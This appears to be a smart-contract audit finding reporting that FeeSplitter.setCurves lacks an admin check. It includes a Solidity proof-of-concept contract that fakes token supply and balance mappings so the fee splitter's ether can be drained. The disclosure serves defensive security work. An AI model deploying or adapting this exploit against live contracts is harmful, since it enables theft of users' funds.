# Vulnerability details

## Impact
The function ```feeSplitter.setCurves(Curves curves_)``` needs an onlyAdmin modifier. 

This function being of public access to anyone allows for a malicious actor to inject an altered version of the Curves smart contract. Finally, leading to a loss of the entire ether balance the protocol might hold in ```FeeSplitter.sol```.

## Tools Used
Malicious Curves contract with the capacity to manipulate the mappings from which  the ```FeeSplitter.sol``` contract will read from. ```maliciousCurves.curvesTokenSupply(subject)```, ```maliciousCurves.curvesTokenBalance(subject, holder)```

```

pragma solidity ^0.8.7;

import "../../src/Curves.sol";

contract NotCurves is Curves {

    address public attacker;
    // Constructor to satisfy original Curves implementation
    constructor(
        address _factory,
        address _feeDist
    ) Curves(_factory, _feeDist) {
        attacker = msg.sender;
    }

    // We can change the states of the mappings of this instance,
    // which will be interpreted as the ones from the intended one.

    function changeSupply(
        uint256 _fakeSupply,
        address _targetAddress
    ) external {
        require(msg.sender == attacker);
        curvesTokenSupply[_targetAddress] = _fakeSupply;
    }

    function changeTokenBalance(
        address _tokenSub,
        address _holder,
        uint256 _fakeAmount
    ) external {
        require(msg.sender == attacker);
        curvesTokenBalance[_tokenSub][_holder] = _fakeAmount;
    }
}
```
With this contract deployed and the function ```feeSplitter.setCurves(Curves curves_)``` being public, both ```FeeSplitter.sol``` can be fully drained.

